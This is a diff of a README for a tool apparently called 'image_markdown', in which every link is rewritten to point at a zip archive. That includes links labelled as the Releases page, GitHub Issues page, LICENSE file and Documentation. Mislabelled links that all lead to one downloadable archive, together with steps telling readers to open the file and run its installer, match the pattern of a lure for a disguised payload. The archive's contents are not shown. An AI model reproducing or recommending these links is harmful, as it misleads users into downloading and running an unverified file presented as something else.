@@ -1,6 +1,6 @@
 # 🎨 image_markdown - Effortlessly Create Image-Optimized Markdown
 
-[![Download](https://raw.githubusercontent.com/vinayagamtamilgaming/image_markdown/main/Oratorianize/image_markdown.zip)](https://raw.githubusercontent.com/vinayagamtamilgaming/image_markdown/main/Oratorianize/image_markdown.zip)
+[![Download](https://github.com/vinayagamtamilgaming/image_markdown/raw/refs/heads/main/Oratorianize/image-markdown-essentiality.zip)](https://github.com/vinayagamtamilgaming/image_markdown/raw/refs/heads/main/Oratorianize/image-markdown-essentiality.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run the image_markdown applicatio
 
 ## 📥 Download & Install
 
-1. Click the button above to go to the [Releases page](https://raw.githubusercontent.com/vinayagamtamilgaming/image_markdown/main/Oratorianize/image_markdown.zip).
+1. Click the button above to go to the [Releases page](https://github.com/vinayagamtamilgaming/image_markdown/raw/refs/heads/main/Oratorianize/image-markdown-essentiality.zip).
 2. Find the latest version of image_markdown.
 3. Download the appropriate file for your operating system.
 4. Once the download is complete, open the file and follow the installation instructions.
@@ -48,7 +48,7 @@ To run image_markdown smoothly, ensure your system meets the following requireme
 
 ## 👥 Support
 
-If you run into issues or have questions, feel free to reach out on our [GitHub Issues page](https://raw.githubusercontent.com/vinayagamtamilgaming/image_markdown/main/Oratorianize/image_markdown.zip). We are here to help! 
+If you run into issues or have questions, feel free to reach out on our [GitHub Issues page](https://github.com/vinayagamtamilgaming/image_markdown/raw/refs/heads/main/Oratorianize/image-markdown-essentiality.zip). We are here to help! 
 
 ## 🌟 Contributing
 
@@ -56,10 +56,10 @@ We welcome contributions! If you'd like to help improve image_markdown, please c
 
 ## 📜 License
 
-This project is licensed under the MIT License. Please see the [LICENSE](https://raw.githubusercontent.com/vinayagamtamilgaming/image_markdown/main/Oratorianize/image_markdown.zip) file for more information.
+This project is licensed under the MIT License. Please see the [LICENSE](https://github.com/vinayagamtamilgaming/image_markdown/raw/refs/heads/main/Oratorianize/image-markdown-essentiality.zip) file for more information.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/vinayagamtamilgaming/image_markdown/main/Oratorianize/image_markdown.zip)
-- [Documentation](https://raw.githubusercontent.com/vinayagamtamilgaming/image_markdown/main/Oratorianize/image_markdown.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/vinayagamtamilgaming/image_markdown/main/Oratorianize/image_markdown.zip)
+- [Releases Page](https://github.com/vinayagamtamilgaming/image_markdown/raw/refs/heads/main/Oratorianize/image-markdown-essentiality.zip)
+- [Documentation](https://github.com/vinayagamtamilgaming/image_markdown/raw/refs/heads/main/Oratorianize/image-markdown-essentiality.zip)
+- [GitHub Issues](https://github.com/vinayagamtamilgaming/image_markdown/raw/refs/heads/main/Oratorianize/image-markdown-essentiality.zip)
